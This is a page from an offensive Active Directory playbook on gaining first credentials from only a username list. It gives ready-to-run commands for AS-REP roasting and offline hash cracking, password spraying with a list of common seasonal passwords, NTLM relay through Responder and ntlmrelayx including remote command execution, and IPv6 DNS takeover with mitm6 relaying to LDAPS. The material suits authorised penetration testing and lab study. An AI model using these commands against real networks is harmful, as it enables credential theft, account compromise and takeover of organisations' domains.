---
title: "03 · Initial Access (No Creds)"
---

# 03 · Initial Access (No Creds)

> Get a first set of credentials when you have nothing but a username list and network access.

!!! note "Phase overview"
    You have valid usernames from Phase 1 but no passwords. Four canonical paths in: `ASREPRoasting` (account-specific misconfig), password spraying (organization-wide weak passwords), NTLM relay (network-level misconfig), and IPv6 takeover (default Windows misconfig). Always check the password lockout policy BEFORE spraying : see Step 1.5.

### 3.1 · ASREPRoasting

!!! info "Why this works / how it chains"

    Normally Kerberos preauth requires you to encrypt a timestamp with the user's password before the KDC sends an `AS-REP`. If preauth is disabled, the KDC sends an AS-REP encrypted with the user's password hash to anyone who asks, meaning you can crack it offline. `GetNPUsers` tries every name in your list and returns hashable AS-REPs for the misconfigured ones.

!!! warning "What leads here"
    - Valid usernames found (Phase 1.6)
    - No credentials yet
    - 'Do not require Kerberos preauthentication' (DONT_REQ_PREAUTH) set on at least one account
    - Signs: BloodHound 'Find AS-REP Roastable Users' query, or just spray-test all users

```bash title="Roast + crack"
impacket-GetNPUsers domain.local/ \
  -usersfile users.txt \
  -no-pass \
  -dc-ip <IP> \
  -format hashcat \
  -outputfile asrep.txt

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

!!! success "Leads to →"
    - Cracked password → valid domain creds → Phase 4 (post-exploitation)


### 3.2 · Password Spraying

!!! info "Why this works / how it chains"

    Spraying inverts brute force: instead of many passwords against one user, try one password against many users. This stays under per-account lockout thresholds.

    - Two rules: 
        - (1) ALWAYS check the policy with ***`--pass-pol`*** first, and 
        - (2) seasonal/year-based passwords for example ('Spring2024!', 'Welcome2024!') are still shockingly effective in real environments.

!!! warning "What leads here"
    - Valid username list
    - Password policy checked (lockout threshold known!)
    - Common passwords likely in use (any org with > 50 users)

```bash title="Check policy first"
# Check policy FIRST - avoid lockout
nxc smb <IP> -u validuser -p pass --pass-pol
```

```bash title="Spray"
# Spray (1 password at a time)
kerbrute passwordspray -d domain.local --dc <IP> users.txt 'Password123!'
nxc smb <IP> -u users.txt -p 'Welcome1!' --continue-on-success

# Common passwords
'Password123!' 'Welcome1!' 'Welcome2024!' 'Company2024!'
'Summer2024!' 'Winter2024!' 'January2024!' 'Spring2024!'
```


### 3.3 · NTLM Relay

!!! info "Why this works / how it chains"

    `NTLM` authentication can be relayed to a different service if `SMB` signing isn't enforced. Responder poisons LLMNR/NBT-NS broadcast queries to make Windows machines authenticate to you, then ntlmrelayx forwards that auth to a target where you become the user. Disable SMB and HTTP in Responder.conf so they don't intercept the auth, you want it to flow through to ntlmrelayx instead.

!!! warning "What leads here"
    - SMB signing disabled (nxc output shows signing:False)
    - Can trigger authentication (Responder for broadcast poisoning, or coercion attacks from Phase 22)

```bash title="Generate target list + relay"
nxc smb <IP>/24 --gen-relay-list targets.txt

# Edit Responder.conf: SMB=Off, HTTP=Off
responder -I tun0 -rdwv

impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -i   # interactive
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

!!! success "Leads to →"
    - Relayed to SMB → command exec / shell on target
    - Relayed to LDAP → add computer / grant DCSync (Phase 23.1)
    - Relayed to ADCS HTTP → machine cert → DCSync (Phase 5 ESC8)


### 3.4 · IPv6 DNS Takeover (mitm6)

!!! info "Why this works / how it chains"

    Windows prefers IPv6 over IPv4. mitm6 advertises itself as an IPv6 DNS server via DHCPv6, and Windows happily switches to it. You then resolve WPAD requests to your own host, which makes browsers send NTLM auth to you. Pair it with ntlmrelayx -6 to forward that auth to LDAPS where you can add a computer object or grant yourself DCSync.

!!! warning "What leads here"
    - IPv6 enabled on network (default on every modern Windows install)
    - No IPv6 DNS server configured (default in most environments)

```bash title="mitm6 + relay to LDAPS"
mitm6 -d domain.local
impacket-ntlmrelayx -6 -t ldaps://<DC_IP> \
  -wh fakewpad.domain.local -l loot
```

